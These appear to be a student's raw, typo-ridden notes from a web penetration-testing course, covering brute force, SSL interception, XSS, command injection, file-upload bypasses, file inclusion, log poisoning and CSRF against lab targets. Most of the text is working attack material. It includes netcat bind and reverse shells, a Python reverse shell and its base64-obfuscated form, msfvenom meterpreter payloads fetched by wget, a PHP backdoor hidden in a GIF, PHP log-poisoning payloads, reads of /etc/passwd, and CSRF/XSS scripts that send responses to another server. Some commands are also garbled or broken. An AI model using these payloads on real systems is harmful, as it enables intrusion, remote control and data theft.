curl -v www.securitytube.net
#netcat
nc www.securitytube.net 80
GET / HTTP/1.0
Host: www.securitytube.net

#multiple reuest for resources  with same TCP connection
#HTTP.1.1
nc www.securitytube.net 80
GET / HTTP/1.1
Host: www.securitytube.net
connection: close
#HTTP methods and verb tampering
#Option methods
curl -v -X OPTIONS http://securitytube.net
curl -v -X OPTIONS http://www.vivekramchandran.com
#head
curl -v -X HEAD http://securitytube.neT
#nmap script for web tampering
nmap -sV --script http-method-tamper <target>
nmap -p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' <target>
# metasploit http options
use auxiliary/scanner/http/options
#nmap scripts to find http methods
nmap --script=http-methods.nse www.hanuinnotech.com -n -p 80
nmap --script=http-methods.nse --script-args http-methods.retest=1 www.hanuinnotech.com -n -p 80
#verb tampering
curl -v -X POST http://192.168.111.134/secret/
#now use tempering with get
curl -v -X GET http://192.168.111.134/secret/
#basic auth never block multipl tries
#nmap brute force
mkdir demo
cd demo
vim user.txt
admin
nick
:wq
#generate password file
crunch 5 5 asd > pass.txt
pwd
nmap  -p 80 --script http-brute --script-args 'http-brute.hostname=pentesteracdemylab.appspot.com,http-brute.method=POST,http-brute.path=/lab/webapp/basicauth,userdb=/root/demo/users.txt,passdb=/root/demo/pass.txt' -n -v pentesteracdameylab.appspot.com
#metasploit module
search http_login
use auxiliary/scanner/http/http_login
show option
set auth_uri /lab/webapp/basicauth
set blank_password false
set pass_file /root/demo/pass.txt
set requesttype post
set rhost pentesteracdaemylab.appspot.com
set stop_on_sucess true
set threads 20
set username admin
set vhost pentesteracdaemylab.appspot.com
set user_file ''
set user_as_pass false
set userpass_file ''
exploit
#digest auth send hash of password
python
import hashlib
hash1 = hashlib.md5('admin:Pentester Academy:asdds').hexdigest()
hash2 = hashlib.md5('GET:/lab/webapp/digest/1').hexdigest() 
#clauate response
nonce = "4ca2d88da3563cf52a52dadaf1bba002"
response_string = hash1 + ':' + nonce + ':' + hash2
response_string
response = hashlib.md5(response_string).hexdigest()
response
#12)http-digest-auth rfc 2617
#open sample file of pcap
#http filter
# 304 open follow tcp stream\
#write puthon
import hashlib
 hash1 = hashlib.md5("vivek:Pentester-Academy:pentesteracademy").hexdigest()
 hash1
'4260744fc3c98fd3223426fc152374a4'
hash2 = hashlib.md5("GET:/").hexdigest()
 hash2
nonce = "cmMXCA/nBAA=7002cad884ece9b87dd63d4a0aa7f3b1cf9f731b"
nonceCount = "00000001"
clientnonce = "c6470d4d075843c9"
qop  = "auth"


responce_string = hash1 + ':' + nonce + ':' + nonceCount + ':' + clientnonce+ ':' + qop + ':' +  hash2
responce = hashlib.md5(responce_string).hexdigest()
responce
#13)http-statelessner-cookie
#if set cookies doesnot have expire it means its sesson key 
hhtp.set_cookie
#14 http set cookie with
hhtpcookie.py
apt-get install python-pip
y
#pip is like apt-get for python mod
pip install webob
pip install paste
pip install webapp2
vim httpcookie.py
chmod a+x httpcookie.py
python httpcookie.py
#browse 
localhost:8080
#hit url again
/blog
/forum
/formus
#15)-session-id
#)016-ssl-transport-layer-protection
#)017-SSL-MITM-using-Proxies
#pper into http
#acces to private key
#MIMTM attack with self signed certificate
#tools like sslstrip to force https to http
kali
setup burp
intercept on
set self sgined certicaste in burp
temp turn off intercept
visit gmail https
#you will get this connection is untrusted 
this certifacte is send to browser and the browser tels you untrusted certifcate 
add exception
turn intercept is on
sign in gmail
forward 
and you can see password and user name becasue our certificate is used on burpsuite
#)018-file-extraction-http-traffic
<> *apt-get install tcpxtract
terminal
tcpextract
mkdir pademo
tcpxtract -etho -o ademo
browsewbsite
#)019-html-injection-basics
#injection attacks
front end 
-rendering attacks html injection
code execution js insection (xss)
backened (server)
sql injection etc
cd /var/www/
mkdir htmlinjection
cp htmli.php
apache2ctl start
ifconfig
localhost/htmlinjection/htmli.php
pass the input
localhost/htmlinjection/htmli.php?nickname=sami
htnl injection bcaasue developer not sanitazing the input this pas to application and reflect back as it is 
localhost/htmlinjection/htmli.php?nickname=<b>sami</b>
localhost/htmlinjection/htmli.php?nickname=<b>sami</b>plase click on link <a href="http://google.com">login here</a>
#attacker can do local rerendering send via email parameter can also be encoded
#)020-html-injection-in-tag-attributes
cat htmltagsi.php
cp /var/www/html/htmlinjection/htmltagsi.php
localhost/htmlinjection/htmlags.php?
vim htmlags.php
#hidden field value actually passed based on user input  
localhost/htmlinjection/htmtags.php?sid=sami">
localhost/htmlinjection/htmtags.php?sid=sami"><!--
#html browser is at lot of resilance database would scream for same level 
#open text editor
"></form>paste form
make it one line
add new values <!--
copy all paste in browser
#)021a-xhr-basics
sam origin policy
cross origin resource sharing
vulnerable app
#/lab/webapp/jfb/xhr?url=www
fetch data from 
/lab/webapp/jfb/xhr/data (dump of date and time)
#write javascript for it
#xmlhhtp request has two posibillites 1 synchrones and 2 asynchrones
#typically you need to asyncrounous becasue syncrounus block execution of any other script on page 
#asyncrounous boolean true
you need to use function that handle the requested data
#readystate (4 done operation is complete) (status value ok = 200)
base64encoder website
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function ()
{
if (req.readystate == 4 && req.status == 200)
{
response_data = req.responseText;
alert(response_data);
}
}
req.open("GET", "/lab/webapp/jfp/xhr/data", true); 
req.send();
</script>

encode copy it out
http://.../lab/webapp/jfb/xhr?url=(paste encoded)
#2 display the result in the DIV with ID result
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function ()
{
if (req.readystate == 4 && req.status == 200)
{
response_data = req.responseText;
document.getElementById("result").innerHTML = response_data;
}
}
req.open("GET", "/lab/webapp/jfp/xhr/data", true); 
req.send();
</script>
encode copy it out
http://.../lab/webapp/jfb/xhr?url=(paste encoded)
#)21-html-injection-3rd-party-sources
#API for everythings
#softwrae as service
#3d party API data source
fetch title
www.securtitytube.net
it fetches title of that webpage
#what attacker can do is he can host any website with code so that he can do htmlinjection
<html><title><h1>vulnerable to htmli</h1></title></html>
fetch title
#feed vulnarable url
#)22-html-injection-bypass-filter
python
import cgi
user_input = "<h1>vulnerable to htmli</h1>"
cgi.escape(user_input)
#less then and gretaer then sign are escape
user_input = "<h1>vulnerable to htmli</h1> ' "
cgi.escape(user_input)
#single qoute will not escape
#python triple dobule qoute means is preformatted everything inside
user_input2 = '"'
cgi.escape(user_input2)
#cgi doesnot escape single and double qoute
#reported as vulnerability cgi.escape can lead to xss
cgi.escape(user_input2, qoute=True)
#double qoutes are escape but not singleqoutes
cgi.escape(user_input1, qoute=True)
#many of webdeveloper start using popular API and library aviable to escape html without understanding  there purpse
#lots of this library not written to prevent attack rather to escape the most common elemnt that can cause issue during rendering
#in url login page
><&"'
#><& escape properly but double qoute vanish becasue it doesnot escape
#double " it break the jail
sample" onmouseover="alert('xss');
#sign in
#when handover that filed evnt trigger you get alert 
#look source code how we tamper it
#there could be other bypassing way like justwe saw
#)23-command-injection
cp commadinjection.zip /var/www/html
unzip commadinjection.zip 
vim commadinjection.zip 
apach2ctl start
ifconfig
browse commadinjection/list.php
commadinjection/list.php?path=/tmp/
ls -alh /var/www ; ping -c 4 google.com ;
commadinjection/list.php?path=/tmp/; ping -c 4 google.com;
#you can do ton of thing here if netcat is avilabel you can invoke netcat as listner
#-e program to invoke
commadinjection/list.php?path=/tmp/; nc -l -p 4444 -e /bin/bash;
nc 192.168.1.13 4444
ls
ps
wcat /etc/passwd
exit
#)24-command-injection-filters
vim list-filter.php
#replace or ban colon
/list-filter.php?path=/tmp/ ; ping -c 4 google.com;
#nothing happens
#look for other bypass technique
list-filter.php?path=/tmp/ | pwd 
list-filter.php?path=/tmp/ | nc -l -p 4444 -e /bin/bash
nc 192.....145 4444
ls
#php API for escaping
#escapeshellarg 
#escapehellcmd
vim list-flter2.php
list-filter2.php?path=/tmp/ | nc -l -p 4444 -e /bin/bash
#cant depend on filters
#using user input must be avoided
#)25-web-to-shell-on-the-server
#upload backdoor on the server to execute command on server 
ubuntuserver
cp index.html list.php /var/www/
cd 
#we assume var/www is writebale by web process
sudo chmod -R 7777 /var/www/
#vulnerable command injection
list.php?path=/;pwd
#how to get shell on box
#kali
cd /usr/share/webshells/
#web shell are specilaize program that can be used as backdoor to execute commad
cd php/
ls
ifconfig
python -m SimpleHttpServer 
#download file to vulnerable webserver wget http://192attackerip:8000/php-backdoor.php
#check 
list.php?path=.
192../php-backdoor.php
192../php-backdoor.php?d=/
#we cant go to root we are limited priv we can do priv attacks
#php backoor has own section which allow you to work with mysql extra once you figure out the password
#)26-web-shells-php-meterpreter
#web dir is not writable
msfvenom -p php/meterpreter/reverse_tcp -lhost=attacker -f raw > php-meter.php
vim php-meterpreter
#when we opne # is there we need to remove the guard bit
#run pthon -m SimpleHTTPserver
192.../list.php?path=/;wget http:/192....:8000/php-meter.php;
192.../list.php?path=.
#we cant see our meterperetr because www is not writabel
#its not writeable but there directory which are writeable
192.../list.php?path=.;wget -O /tmp/php-meter.php http://192....:8000/php-meter.php;
192.../list.php?path=/tmp 
#setup handler
set payload php/meterpreter/reverse_tcp
set lhost 
option exploit
192.../list.php?path=/tmp/; php -f /tmp/php-meter.php;
#yep session
getuid
#)27-xss
#its client side vulnerability
#in web world clinet is web browser
 #attacker can insert javascript into webpage that can be render on that client either in persistance or non persistance waywhen theis happen
#he can execute java script in the context of current user on the website whic he found xss vuln 
"><script>alert("vulnerable to xss")</script><!--
sign in
#if cookies is there
"><script>alert(document.cookie)</script><!--
#chrome has xss protetion bulit in
click java script console 
#now no xss
#manmy basic xss will not work beaxuse of chrome xss auditor
#you can beat xss auditir
#)28-xss-types
#xss type
perisistance 
non persistance
dom based
#persistance type 1 xss 
this is the case actual xss attack payload get stored on server side and it will render every time you visit vulnerable webpage
#dvwa
dvwas security low
xss store
sami
hello all
<script>alert(document.cookie)</alert>
sign
view code
find the script tag embedded in it
referes the page you will find attacks is there
#non persistance type 2
"><script>alert("vulnerable to xss")</script><!--
#every time we need to send the atack script
#)29-xss-via-event-handlers
#event handler make page interactive mouse hover
#require user interaction
click
#no user interaction
onload
onerror
sami@gmail.com" <script>(1)</script><!--
view source code
#all of less and greater sign encode
@add event handler
abc" onmouseover=alert("xss") "
sign in
view page source
we added eventhandler
#most of time we can escape cgi.escape filter
#)29a-dom-xss
claculator webapp
view source code
#any javascript will be evalutaed
#eval(statemnt); 
#basically modifyin dom
#url
/dom?statement=alert(1)
/dom?statement=alert(document.cookie)
#)30-web-shell-netcat-reverse-connect
no write acess
assume /tmp aslo not acessible
rely on utiltes instaleld netcat
nc -h
nc -e allow execute a program after connect
#cp list.php /var/www/ 
192.../list.php?path=/;pwd
nc -l -p 10000 -vvv
192.../list.php?path=/; nc -e /bin/bash 192.168.1.10 10000
id
pwd
whoami
ps
exit
#the best of technique is we haventy created any file so we dont need write acess
#)31-web-shell-python-php
# nc option doesnot support -e
#the webserevr may be running wwwdata means you cant install packages
#answer use interpeter
#apart from writing script we can invoke commadn directly
python -c "print 'helloo world'"
copy the command
and paste
192.../list.php?path=/;whereis python
192.../list.php?path=/; python -c "print 'helloo world'"
#we include entire script to create revershell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.145",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'	
  	
  
nc -l -p 1000
shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.145",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'.encode('base64')
shell.dcode('base64')
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F\nVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTExLjE0NSIsMTAwMDAp\nKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihz\nLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==\n'.decode('base64'))"	
  	
  
#)32-getting-beyond-alert-xss
*404* rey on youtube
#)33-file-upload-vulnerability-basics
cd file_upload/content-type/
 chmod 777 uploads/
vim upload.php
#open page file.htm
browse 
uplaod gif
uplad backdoor
opnburp suite
#firefox send all trafic through proxy 
manula proxy
localhost port 8080
ok
burp intercept on
upload backdoor
#change content-type:image/gif 
forward
remove intercept off
#broser
file_upload/content-type/upload/simple-backdoor.php
#)35-Bypassing-Blacklists-file-upload
chmod 777 /var/www/file_upload/blacklist/uplaods/
vim blacklist.php
uplaod backdoor.php
just renmae with cap
uplaod backdoor.PHP
#sucess
#not checking for case sensitivity
#but nothing will execute
#appache server doesnot detect something that execute
#solev problem allows .htacces to work
vim /etc/apach2/sites-aaviable/default
direcory /var/www/
AllowOverride All
apache2ctl restart
pwd
vim .htaccess
AddType application/x-httpd-php PHP
:wq
upload
right click show hidden file
.htaccess
open simple backdoor.PHP
#you can have any extension
mv backdoor.PHP backdoor.blah
vim .htaccess
AddType application/x-httpd-php blaha
#what this directive does is for file extension with blah it pret much go ahead and invokkes the php subsystem to handles it
uplad both files .htaccess file and .blah
#)36-bypassing-blacklists-withphpx
vim /etc/apache2/mod-availbel
mkdir demos
cp simplebackdoors.php2 /demos
cp simplebackdoors.php3 /demos
cp simplebackdoors.php4 /demos
cp simplebackdoors.php5 /demos
@will not execute but other will works
cp simplebackdoors.php /demos
#)37-bypassing-whitelists-using-double-extensions-in-file-uploads
#apache double extension
vim /etc/apache2/mods-aavilable/php5.conf
#remove $
apach2ctl restart
#)038-defeating-getimagesize-checks-file-upload
#getimagesize
cd file_upload/getimagesize
mkdir uloads
chmod 777 uploads
#to beat this almost all image format support attaching  metainformation in it which include comment and bunch of other things 
#when ever php ointerpretr start reading the files it will scan open php execute and close php excute tags  if it finds tag it will execut it.
# find gif file for use
file . -name *.gif
copy gif file into workbench
#need utility to add comment in gif file
apt-get install gifsicle
string  action.gif
gifsicle --comment "<?php echo 'hacked' ?>" < action.gif > action_out.php.gif
strings action_back.php.gif
now uplaod
#strip new line
tr '\n' ' ' < simple-backdoor.php
gifsicle --comment "` tr '\n' ' ' < simple-backdoor.php `" < action_back.gif > action_back.php.gif
#backdoor is inserted
string simple-backdoor.php.gif
rm uploads/action_back.php.gif
upload the file
#39-null-bye-injection-file-uploads
#null byte injection in file names
vim /etc/apac2/mod-avialbel/php5.conf
put the dollar #
apache2ctl restart
#setup burp
cd workbench
rm *
cp gif workbench
cp simplabackdoor.php 
gifsicle --comment "`tr '\n' ' ' < simple-backdoor.php`" <action.gif > action.out.gif
file demo.gif
chmod 777 uploads/
cd file_upload/null_byte
uplad
demo.php.gif
upload 
accces the file
file name demo.gif
enable intercept on 
uplaod file action_back_out_gif
demo.phpA.gif
#capita A is replace in hex mode and make it null so that when php works with file because of the fact that it is going to c libraries null will replace the A would end up terminate the string and file will be saved as demo.php	
hex view
go to hex view
A is 41 in hex replace it with 00
forward it
intercept off
go to uplaod dir
demp.php?cmd=cat+ext/passwd
#)40-exploiting-file-uploads-to-get-meterpreter
cp basic_file uplaod
cd workbench
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.111.150 -f raw >  meterpreter.php
#remove guard bit
save php file
uplaod on server
#setup handler
set payload php/meterpreter/reverse_tcp 
set lhost=192.168.111.150
exploit
pwd
#)41-remote-file-inclusion-vulnerability-basics
#user editable input is used to include other file execution flow
#to rfi work allow_url_include = On (/etc/php/apache2/php.ini)
#default installion its off 
vim
etc/php/apache2/php.ini
allow_url_include = On
:wq
cd /rfi
apache2ctl restart
localhost/rfi/rfi.php?file=home.php
localhost/rfi/rfi.php?file
localhost/rfi/rfi.php?file=contact.php
mkdir rfi
ifconfig
cd rfi
cp /usr/share/webshells/php/simple-backdoor.php .  
python server
localhost/rfi/rfi.php?file=http://192.168.111.150:8000/simple-backdoor.php
(& becasue its additional parameters)
localhost/rfi/rfi.php?file=http://192.168.111.150:8000/simple-backdoor.php&cmd=cat+/etc/passwd
#rfi also means you can acess local files
localhost/rfi/rfi.php?file=/etc/passwd
#if we turnoff file include
#restart appache2ctl
#check error logs
tail -f /var/log/apache2/error.log -n 0
localhost/rfi/rfi.php?file=/etc/passwd
#)42-exploiting-rfi-with-forced-extensions
vim
etc/php/apache2/php.ini
allow_url_include = On
cd rfilimited
localhost/rfilimited/rfi.php?file=home.php
localhost/rfilimited/rfi.php?file
localhost/rfilimited/rfi.php?file=contact.php
ls
cp /usr/sahre/webshell/php/simplebackdoor.php .
server python
localhost/rfi/rfi.php?file=http://192.168.111.150:8000/simple-backdoor.php&cmd=cat+/etc/passwd
#.html will append what ever url we are appendig to it
#404
cp backdoor.php backdoor.php.html
localhost/rfi/rfi.php?file=http://192.168.111.150:8000/simple-backdoor.php&cmd=cat+/etc/passwd
#other ways
#lets says you are getting  file from sever is not full conrol of attacker
#lets try to invalidate .html using different technique 
localhost/rfi/rfi.php?cmd=id&file=http://192.168.111.150:8000/simple-backdoor.php?
#?.html it become parameter rather then part of the base url and it wil execute
#other way is to make.html and anchor it can be done by 
localhost/rfi/rfi.php?cmd=pwd&file=http://192.168.111.150:8000/simple-backdoor.php%23
#hex for hash hash is interpreted locally by the browser as anchor tag actual file is fetched is prety much simple-backdoor.php
#othger thhing you can do to is push this out as additionnal paramter of some kind  then you could do %26
localhost/rfi/rfi.php?cmd=pwd&file=http://192.168.111.150:8000/simple-backdoor.php?%26var2=
#now url bcome simple backdoor php 
#this entire thing now becomes way ofpassing additiona parameteres and ofcourse file is happpily fetched with 200 ok once again
#)43-rfi-to-meterpreter
cd rfi limited
msfvenom -p php/meterpreter/reverse_tcp lhost 192.168.111.151 -f raw > meter.php 
#remvoe the hash guard
wq
setup server python
localhost/rfi/rfi.php?cmd=pwd&file=http://192.168.111.150:8000/meter.php?
#setup handler
set payload php/.../reverse_tcp
set lhost exploit
#hit enter browser 
shell
getuid
#)44-lfi-basics
#rfi only work if allowed url is actually set to on most cases lfi can work
cd lfi
vim lfi.php
localhost/lfi/lfi.php?page=home.html
localhost/lfi/lfi.php?page=contact.html
cat home.html
ls
python server
localhost/lfi/lfi.php?page=http://192.168.111.150-backdoor.php
tail -f /var/log/apache2/error.log -n 0
#will not work all we left with lfi
localhost/lfi/lfi.php?page=/etc/passwd
#kali
ls /var/log/apache2/ -l
#other interesting thing you can do try to read .htacess
localhost/lfi/lfi.php?page=../.htaccess
localhost/lfi/lfi.php?page=../.htpasswd
#most of time htaccess file has opn and close tag you will be not able to view every thing here
view page source 
#here in this case we actualy have file called credit card which only one protected insie the basic directrory
#now we try to acess 
localhost/lfi/basic/creditcard
but we get an authentication alert 
#best part is you actually you read credit card directory directly using lfi
localhost/lfi/lfi.php?page=creditcard
#)45-lfi-with-directory-prepends
cd lfi_prependir
localhost/lfi_prependir/lfi.php?page=home.html
cat /html/contact.html
#in sucah case we can do path trevasl attack such case we dont know where etc passwd is
localhost/lfi/lfi.php?page=../etc/passwd
localhost/lfi/lfi.php?page=../../etc/passwd
localhost/lfi/lfi.php?page=../../../etc/passwd
localhost/lfi/lfi.php?page=../../../../etc/passwd
localhost/lfi/lfi.php?page=../.htaccess
localhost/lfi/lfi.php?page=../creditcard
localhost/lfi/lfi.php?page=../.htpasswd
#)46-remote-code-execution-with-lfi-and-file-upload
cd lfi_fileupload
localhost/rce_lfi_fileupload/file.html
cd workbench
cp /usr/share/webshells/php/simple-backdoor.php .
gifsicle --comment "`tr '\n' ' ' < simple-backdoor.php`" < action_back.gif > action_back_out.gif
strings action_back_out_gif
upload backdoor
acess the file
#we cant becasue its not in lfi but
localhost..php?page=../uploads/action_back_out.gif&cmd=cat+/etc/paswd
chmod 777 /uplaods
#)47-lfi-appened-null-byte
look at lfi where file extension actuaaly been focefully append as well
cd lfi_prependappend
ifconfig
..149/demo/lfi_prependappend/lfi.php?page=home
..149/demo/lfi_prependappend/lfi.php?page=contact%00 
#this end up terminateing the string it will end up picking up contact rather then html from html dir
#this is because the string is pass to the  c library which work for php and they intern null as 00 as string terminater 
..149/demo/lfi_prependappend/lfi.php?page=../etc/passwd%00 
..149/demo/lfi_prependappend/lfi.php?page=../../etc/passwd%00 
..149/demo/lfi_prependappend/lfi.php?page=../../../etc/passwd%00 
..149/demo/lfi_prependappend/lfi.php?page=../../../../../etc/passwd%00 
#)48-rce-lfi-and-log-poisoning
#attacker inject in PHP code into logs
#metasploitable 2
#code basic LFI
ifconfig
msfadmin
msfadmin
cd /var/logs
ls -l
#make log dir redable
su bash
chmod 755 -R apache2/
...149/lfi/lfi.php?page=/var/log/apache2/access.log
tail -f apache2/acess.log
#there various  ways to inject we are injecting in useragnet field using burp suite 
intercept on
remove (x11... firefox/24.o
<?php echo system($_GET['cmd']); exit; ?>
forward
and off intercept
check logs for injections
.40/lfi.php?page=/var/log/apache2/acess.log&cmd=ls
# sucess
.40/lfi.php?page=/var/log/apache2/acess.log&cmd=ps ax
.40/lfi.php?page=/var/log/apache2/acess.log&cmd=pwd
.40/lfi.php?page=/var/log/apache2/acess.log&cmd=cat /etc/passwd
#49)-rce-lfi-ssh-log-poison
metasploitable2
vul code lfi.zip
ls -l /var/log/auth.log
tail -f /var/log/auth.log n 0
ssh root@192.168.111.149
ssh '<?php echo system($_GET["cmd"]); exit; ?>'@192.168.111.149
#)100-unvalidated-redirects
apache2ctl
victim:local machine
cd /var/www/
vim index.php
localhost/index.php/redirect.php?url=http://google.com
#)101-encoding-redirect-params
#encoding = obfuscation
cd encode
chmode +X redirect.php
ls
vim index.php

#url encode and decoder website
http:www.google.com
#use xsscale for full url encoding
#)102-open-redirects-base64-encoded-params
mkdir base64
cp encode bse64/
vim index.php
<?php
encoded_url = urlencode(base64_encode("http://securitytube.net"));
url='.$encoded_url.'"
 vim redirect.php
'.bas64_decode(url...)));
#103)open-redirects-beating-hashes
#hashing algorithm is case sesnative
#104-open-redirects-hashing-with-salt
abc hash was prepended 
get it from local file salthash
#)105-securing-open-redirect
#)106-csrf-basics
click on tools
network
click on csrf
edit and copy it out 
create notepad
attackk.html
<html>
<body>

<img width="1" height="1"  src="http:......menu=900&transferFunds=4000" />
</body>
</html>

open attack.html

also check for if site is vulnaerablr to html attack

hi
<b> am i vulnerable to html injection </b>
submit
restat or reset webgoat
#put csrf payload directly into web page
title: csrf payload
copy <img../>
paste into page submit
#only when we victim cleck the comment then only we can get csrf flag
#there are two possibilites one is attacker lure to malacious web page
other posibiltes is victime site is vulnerable to other attacks like html injection
#)107-csrf-trigger-tags
sign webgoat with guest guest
devloper -> tools -> network
editan dresend copy url
paste in notepad
<iframe src=" paste code" />
title iframe Demo
paste iframe
900&transferFunds=4000" />
submit
network
click iframe deom
#other tag can be used as scipt tag
copy code
paste it
<script src="http...900&transferFunds=4000" />
copy code
pste in web goat and submit
developer-> network (para monitoring)
click on scrip tag message
#preety much any tag allow you to fetch some thing from remote server 
by specification of src parameter in it going to ahead and trigger csrf attack
#what are the other possibilites includes xmlhttp request 
#xmlhttprequest based triggering
#html http request for same
<script>
req = new XMLHttpRequest();
req.open("GET", "http...4000", false);
req.send();
</script>
copy code
restart lesson
xmlhttprequestdemo
paste code
-> network monitor
submit
clcik  html demo
crea
#lets see if we loaded the page with attacker controled web page
create html page
attacker.html
<html>
<body>
<script>
req = new XMLHttpRequest();
req.open("GET", "http:/localhost.....900&transferFunds=4000", false);
req.send();
</script>
</body>
</html>
#open in firefox
#refresh or reset and monitor the network
#)108-csrf-multi-step-operation-handling
network
csrf prompt by pass
step 1 ....menu=900&transferFunds=4000
step 2 Confiramtion page:
view page source
post request 
....menu=900&transferFunds=4000
transferfunds CONFIRM
techniqe we will be using http request 
<script>
var req1 = new XMLHttpRequest();
req1.open("GET", "....menu=900&transferFunds=4000", fasle);
req1.send();
#basically what i want is once this request goes and comes back we can mask e post request to url 
#on  steady state change handler
req1.onreaqdystatchange = function()
{
	if(req.readyState == 4 && req1.statues == 200)
{
		req2 = new XMLHttpRequest();
		req2.open("POST", "....menu=900&transferFunds=4000", fasle);
		req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");	
		req2.send("transferFunds=CONFIRM");
}
};
</script>
copy the code
go to orginal page
restart lesson
#
xmllhhtprequestdemobypassdemo
paste the java script
submit
->network monitor
clcik message
# in the goat solution what they did 
#)109-mitigating-csrf-with-tokens
#csrf prevention with tokens
#csrf token bypass
->network
edit
copy url
110-csrf-and-xss
to bypass write xss payload
<script>
var uid = deocument.forms[0].elements[0].value;
var token = document.forms[0].elements[1].value;	
var req = new XMLHttpRequest();
req.open("POST", "/alb..../delete", true);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

req.send("uid="+uid+ "&csrf_token="+token);

</script>
copy the code 
go to encoder
paste it encode it copy it
penetsteracdameylab..../webapp/csrf/xss?url=paste code (enter)
# alert response

<script>
var uid = deocument.forms[0].elements[0].value;
var token = document.forms[0].elements[1].value;	
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
if (req.readyState == 4 && req.status == 200)
{
	alert(req.responseText);
}
};
req.open("POST", "/alb..../delete", true);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

req.send("uid="+uid+ "&csrf_token="+token);

</script>
copy the code 
go to encoder
paste it encode it copy it
penetsteracdameylab..../webapp/csrf/xss?url=paste code (enter)

# cipy paste in url=paste code
111-csrf-token-bypass-hidden-iframes
#create a wb server
cmd
python -m SimpleHTTPServer 80
local host
#create htnl file
csrff-scss-frame.html
<html>
	<body>
	<h1>welcome to an ointresting website on www </h1>
	<iframe src="http://penetsteracdameylab..../webapp/csrf/xss?url=paste xss code"></iframe>
</body>
</html>
#run the website we got the alert john deletion sucessfull

#make a hidden iframe
<iframe style="display:none"
#run webpage
# now what we gonbe do is javascript is not in much use us
 now post to attacker server
<script>
var uid = deocument.forms[0].elements[0].value;
var token = document.forms[0].elements[1].value;	
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
if (req.readyState == 4 && req.status == 200)
{
	var req2 = new XMLHttpRequest();
	req2.open("GET", "http://localhost/response?resp="+req.responseText, true);
	req2.send();
}
};
req.open("POST", "/alb..../delete", true);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
req.send("uid="+uid+ "&csrf_token="+token);

</script>
